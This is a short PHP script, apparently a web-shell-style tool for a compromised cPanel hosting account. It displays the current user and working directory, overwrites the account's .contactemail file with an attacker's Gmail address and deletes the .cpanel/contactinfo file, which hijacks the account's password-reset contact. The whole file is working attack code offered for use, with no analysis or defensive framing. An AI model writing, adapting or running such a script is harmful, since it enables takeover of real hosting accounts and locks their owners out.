<?php
$cwd = getcwd();
$usr = @get_current_user();
echo '<font color="red"><center><h13>User : </h13>'.$usr.'</center></font><br>';
echo '<font color="red"><center><h13>Path : </h13>'.$cwd.'</center></font><br>';
echo '<font color="red"><center><h13>wdp_mail</h13></center></font><br>';
$fo=fopen("/home/$usr/.contactemail","w");
fwrite($fo,'silntm00t@gmail.com');
$patc = "/home/$usr/.cpanel/contactinfo";
unlink($patc)
?>